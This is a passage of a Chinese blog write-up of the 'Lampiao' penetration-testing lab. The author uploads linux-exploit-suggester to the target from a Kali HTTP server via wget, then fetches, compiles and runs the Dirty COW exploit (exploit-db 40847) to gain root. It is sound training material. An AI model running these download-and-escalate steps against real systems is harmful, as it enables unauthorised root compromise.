+<h4 id="7-1-2-获取提权审计工具并上载到目标机器"><a href="#7-1-2-获取提权审计工具并上载到目标机器" class="headerlink" title="7.1.2 获取提权审计工具并上载到目标机器"></a>7.1.2 获取提权审计工具并上载到目标机器</h4><p>由于我的实验环境配置的是虚拟专用网络，kali无法直接联网下载，我们通过本机下载后Copy到Kali<br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674049537605.png" alt="enter description here"></p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674049775423.png" alt="enter description here"><br>Kali开启http服务，将该ssh脚本上传至靶机<br>Kali：python -m SimpleHTTPServer 8888<br>靶机：先切换目录至tmp下，cd /tmp，再下载脚本<br>wget <a href="http://172.16.50.128:8888/linux-exploit-suggester.sh" target="_blank" rel="noopener">http://172.16.50.128:8888/linux-exploit-suggester.sh</a></p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674054433341.png" alt="enter description here"></p>
+<h4 id="7-1-3-运行LES，审计可用提权漏洞"><a href="#7-1-3-运行LES，审计可用提权漏洞" class="headerlink" title="7.1.3 运行LES，审计可用提权漏洞"></a>7.1.3 运行LES，审计可用提权漏洞</h4><p>赋予脚本文件执行权限，然后运行此脚本，结果中可以看到，工具列举了目标系统版本信息，以及列举漏洞审计结果<br>tiago@lampiao:/tmp$ chmod +x linux-exploit-suggester.sh<br>tiago@lampiao:/tmp$ ./linux-exploit-suggester.sh</p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674055598181.png" alt="enter description here"></p>
+<p>这个工具还是很强大的，<br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674056080129.png" alt="enter description here"></p>
+<p>我们使用脏牛漏洞来尝试提权，这个比较典型，其他的大家可以去试试。</p>
+<h3 id="7-2-通过脏牛漏洞提权"><a href="#7-2-通过脏牛漏洞提权" class="headerlink" title="7.2 通过脏牛漏洞提权"></a>7.2 通过脏牛漏洞提权</h3><h4 id="7-2-1-搜索并获取可用exp"><a href="#7-2-1-搜索并获取可用exp" class="headerlink" title="7.2.1 搜索并获取可用exp"></a>7.2.1 搜索并获取可用exp</h4><p>Google搜索：CVE-2016-5195 exploit<br>找到页面：<a href="https://www.exploit-db.com/exploits/40847" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40847</a><br><em>(40839是旧的，测试其执行后会将靶机打挂掉，建议不要用)</em></p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674059258895.png" alt="enter description here"></p>
+<h4 id="7-2-2-上载文件到目标机器"><a href="#7-2-2-上载文件到目标机器" class="headerlink" title="7.2.2 上载文件到目标机器"></a>7.2.2 上载文件到目标机器</h4><p>我们下载该文件，并上传至kali（kali中应该有该文件，直接使用即可），本次通过直接网站下载的方式，物理机下载到文件复制到Kali，再由靶机从Kali下载到其本地。<br>wget <a href="http://172.16.50.128:8888/40847.cpp" target="_blank" rel="noopener">http://172.16.50.128:8888/40847.cpp</a></p>
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674059258900.png" alt="enter description here">..</p>
+<h4 id="7-2-3-编译执行，获取flag"><a href="#7-2-3-编译执行，获取flag" class="headerlink" title="7.2.3 编译执行，获取flag"></a>7.2.3 编译执行，获取flag</h4><p>在靶机编译40847.cpp文件，执行编译出的二进制文件，获取到flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tiago@lampiao:~$ mv 40847.cpp /tmp/</span><br><span class="line">tiago@lampiao:~$ ls</span><br><span class="line">tiago@lampiao:~$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">tiago@lampiao:/tmp$ ls</span><br><span class="line">40847.cpp</span><br><span class="line">tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o frank 40847.cpp -lutil</span><br><span class="line">tiago@lampiao:/tmp$ ls</span><br><span class="line">40847.cpp  frank</span><br><span class="line">tiago@lampiao:/tmp$ ./frank -s</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1674060053799.png" alt="enter description here"></p>
+<hr>
+<p>文章使用小书匠MarkDown编辑器书写，大家可以通过本站<a href="https://tacgib.cn/2019/07/06/小书匠邀请码/">小书匠邀请码</a>一文获取<strong>邀请码</strong>及<strong>下载链接</strong>。</p>
+<hr>
+<center>秋风木叶</center>
+<center>2023-1-18</center>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>有您的赞赏，我会更加有动力！</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="https://zhengjie.ren/小书匠/1587477501749.png21" alt="秋风木叶 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="https://zhengjie.ren/小书匠/1615647836412.png" alt="秋风木叶 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>秋风木叶
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://tacgib.cn/2023/01/19/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B02%EF%BC%9ALampiao/" title="渗透靶场笔记2：Lampiao">https://tacgib.cn/2023/01/19/渗透靶场笔记2：Lampiao/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%B0%8F%E4%B9%A6%E5%8C%A0/" rel="tag"># 小书匠</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Kali/" rel="tag"># Kali</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/06/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B01%EF%BC%9AGoldenEye/" rel="prev" title="渗透靶场笔记1：GoldenEye">
+      <i class="fa fa-chevron-left"></i> 渗透靶场笔记1：GoldenEye
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/26/HEXO%E6%9B%B4%E6%96%B0%E6%96%87%E7%AB%A0%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B/" rel="next" title="HEXO更新文章报错处理过程">
+      HEXO更新文章报错处理过程 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-配置网络环境"><span class="nav-text">0 配置网络环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-探测靶机IP"><span class="nav-text">1 探测靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-靶机端口扫描"><span class="nav-text">2 靶机端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-访问Web页面信息收集"><span class="nav-text">3 访问Web页面信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-页面枚举，发现价值信息"><span class="nav-text">4 页面枚举，发现价值信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-网站目录爆破"><span class="nav-text">5 网站目录爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-漏洞利用"><span class="nav-text">6 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-MSF获取Shell"><span class="nav-text">6.1 MSF获取Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-获取权限的另一种思路——ssh口令爆破"><span class="nav-text">6.2 获取权限的另一种思路——ssh口令爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-其他思路"><span class="nav-text">6.3 其他思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-提权！"><span class="nav-text">7 提权！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-审计可用提权漏洞"><span class="nav-text">7.1 审计可用提权漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-通过脏牛漏洞提权"><span class="nav-text">7.2 通过脏牛漏洞提权</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">秋风木叶</p>
+  <div class="site-description" itemprop="description">一片宁静自由的空间……</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">107</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://tacgib.cn/" title="https:&#x2F;&#x2F;tacgib.cn">主页</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.oscca.gov.cn/" title="https:&#x2F;&#x2F;www.oscca.gov.cn&#x2F;" rel="noopener" target="_blank">国家密码管理局</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://openstd.samr.gov.cn/bzgk/gb/index" title="https:&#x2F;&#x2F;openstd.samr.gov.cn&#x2F;bzgk&#x2F;gb&#x2F;index" rel="noopener" target="_blank">国家标准全文公开系统</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">秋风木叶</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : true,
+      appId      : 'JPt4HeuQbSMjT4cQoLKEphX7-gzGzoHsz',
+      appKey     : 'J2t8poEMDg21tmRTFirjHgqx',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
